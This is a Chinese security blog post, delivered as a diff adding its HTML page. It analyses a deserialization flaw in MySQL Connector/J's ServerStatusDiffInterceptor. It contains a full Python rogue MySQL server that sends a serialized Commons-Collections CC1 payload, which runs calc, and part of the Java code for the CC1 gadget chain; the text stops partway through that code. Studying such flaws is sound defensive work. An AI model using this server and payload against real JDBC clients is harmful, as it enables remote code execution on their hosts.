@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="无聊ini">
+    <meta name="author" content="follycat">
+    <meta name="referrer" content="no-referrer" />
+    
+    <title>
+        
+            mysql JDBC学习 |
+        
+        follycatのblog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/wul.jpg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"follycatのblog","author":"follycat","avatar":"/images/wul.jpg","logo":"/images/wul.jpg","favicon":"/images/wul.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"If you're reading this, welcome to my blog!","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/wul.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               follycatのblog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        mysql JDBC学习
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/wul.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">follycat</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-03-22 13:24:55</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Thu May 22 2025 23:00:58 GMT+0800">2025-05-22 23:00:58</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.1k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>10 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="什么是JDBC"><a href="#什么是JDBC" class="headerlink" title="什么是JDBC"></a>什么是JDBC</h1><p>JDBC（Java Database Connectivity）是一个 Java API，用于连接和操作数据库。它提供了一套标准接口，使得 Java 程序可以通过 SQL（结构化查询语言）与不同类型的数据库进行交互，而不依赖于特定数据库厂商的实现。</p>
+<p>经典的流程为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //加载数据库驱动</span><br><span class="line"></span><br><span class="line">Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/database_name&quot;, &quot;username&quot;, &quot;password&quot;); //建立数据库连接</span><br><span class="line"></span><br><span class="line">Statement stmt = conn.createStatement();  //创建sql语句对象</span><br><span class="line"></span><br><span class="line">ResultSet rs = stmt.executeQuery(&quot;SELECT * FROM table_name&quot;); //执行sql语句</span><br><span class="line"></span><br><span class="line">while (rs.next()) &#123;</span><br><span class="line">    System.out.println(rs.getString(&quot;column_name&quot;));</span><br><span class="line">&#125;  //处理查询结果</span><br><span class="line"></span><br><span class="line">//关闭资源</span><br><span class="line">rs.close();</span><br><span class="line">stmt.close();</span><br><span class="line">conn.close();</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先，这个漏洞点位于<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>这个·拦截器中·的getObject方法。</p>
+<p>这个拦截器会在URL中指定属性<code>queryInterceptors</code>为<code>ServerStatusDiffInterceptor</code>时 进行调用，并且调用拦截器的preProcess和postProcess方法，从而调用getObject方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742647938704-e7643163-6ddb-4699-91d0-850525853cab.png"></p>
+<p>先找到preProcess方法并继续跟进到<code>populateMapWithSessionStatusValues</code>方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742648000392-2313651b-9f36-4ccf-b076-c346001e0a61.png"></p>
+<p>主要为<code>populateMapWithSessionStatusValues</code>方法中的resultSetToMap方法，继续跟进可以看到调用了getObject方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742648089764-11509fe0-b3f5-4289-8271-cd1cb3ad6a03.png"></p>
+<p>这里调用的getObject方法位于<code>com.mysql.cj.jdbc.result.ResultSetImpl.class</code>中</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1742648259992-d52b6598-bbad-4a65-b49a-604a8f70ba5b.png"></p>
+<p>可以发现在这里调用了readObject，其实往上看objIn参数是由columnsIndex一步步转化过来的。</p>
+<p>所以如果我们可以控制连接的url，让他与我们构造的恶意mysql服务器连接，并且让恶意mysql服务器在收到<code>show session status</code>后向客户端发送可行的payload，就可以使payload进行反序列化，从而触发命令执行</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>python的恶意mysql服务端，payload为cc1到cc11都行，因为我项目这些环境都有，这里选的是cc1，这里的file文件是使用cc1链子序列化成的ser.bin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">greeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span><br><span class="line">response_ok_data=&quot;0700000200000002000000&quot;</span><br><span class="line"></span><br><span class="line">def receive_data(conn):</span><br><span class="line">    data = conn.recv(1024)</span><br><span class="line">    print(&quot;[*] Receiveing the package : &#123;&#125;&quot;.format(data))</span><br><span class="line">    return str(data).lower()</span><br><span class="line"></span><br><span class="line">def send_data(conn,data):</span><br><span class="line">    print(&quot;[*] Sending the package : &#123;&#125;&quot;.format(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line">def get_payload_content():</span><br><span class="line">    #file文件</span><br><span class="line">    file= r&#x27;ser.bin&#x27;</span><br><span class="line">    if os.path.isfile(file):</span><br><span class="line">        with open(file, &#x27;rb&#x27;) as f:</span><br><span class="line">            payload_content = str(binascii.b2a_hex(f.read()),encoding=&#x27;utf-8&#x27;)</span><br><span class="line">        print(&quot;open successs&quot;)</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        print(&quot;open false&quot;)</span><br><span class="line">        #calc</span><br><span class="line">        payload_content=&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span><br><span class="line">    return payload_content</span><br><span class="line"></span><br><span class="line"># 主要逻辑</span><br><span class="line">def run():</span><br><span class="line"></span><br><span class="line">    while 1:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        print(&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;.format(addr[0],addr[1]))</span><br><span class="line"></span><br><span class="line">        # 1.先发送第一个 问候报文</span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        while True:</span><br><span class="line">            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            #其他过程</span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            #查询一些配置信息,其中会发送自己的 版本号</span><br><span class="line">            if &quot;session.auto_increment_increment&quot; in data:</span><br><span class="line">                _payload=&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            elif &quot;show warnings&quot; in data:</span><br><span class="line">                _payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            if &quot;set names&quot; in data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            if &quot;set character_set_results&quot; in data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            if &quot;show session status&quot; in data:</span><br><span class="line">                mysql_data = &#x27;0100000102&#x27;</span><br><span class="line">                mysql_data += &#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br><span class="line">                mysql_data += &#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br><span class="line">                # 为什么我加了EOF Packet 就无法正常运行呢？？</span><br><span class="line">                # 获取payload</span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                # 计算payload长度</span><br><span class="line">                payload_length = str(hex(len(payload_content)//2)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(4)</span><br><span class="line">                payload_length_hex = payload_length[2:4] + payload_length[0:2]</span><br><span class="line">                # 计算数据包长度</span><br><span class="line">                data_len = str(hex(len(payload_content)//2 + 4)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(6)</span><br><span class="line">                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]</span><br><span class="line">                mysql_data += data_len_hex + &#x27;04&#x27; + &#x27;fbfc&#x27;+ payload_length_hex</span><br><span class="line">                mysql_data += str(payload_content)</span><br><span class="line">                mysql_data += &#x27;07000005fe000022000100&#x27;</span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            if &quot;show warnings&quot; in data:</span><br><span class="line">                payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    HOST =&#x27;0.0.0.0&#x27;</span><br><span class="line">    PORT = 3307</span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(1)</span><br><span class="line"></span><br><span class="line">    print(&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;.format(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+<p>cc1链子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">import org.omg.CORBA.portable.InvokeHandler;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC1 &#123;</span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">//        try &#123;</span><br><span class="line">//            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">//        &#125; catch (IOException e) &#123;</span><br><span class="line">//            throw new RuntimeException(e);</span><br><span class="line">//        &#125;</span><br><span class="line">//        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">//                new ConstantTransformer(Runtime.class),</span><br><span class="line">//                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">//                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">//                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">//        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        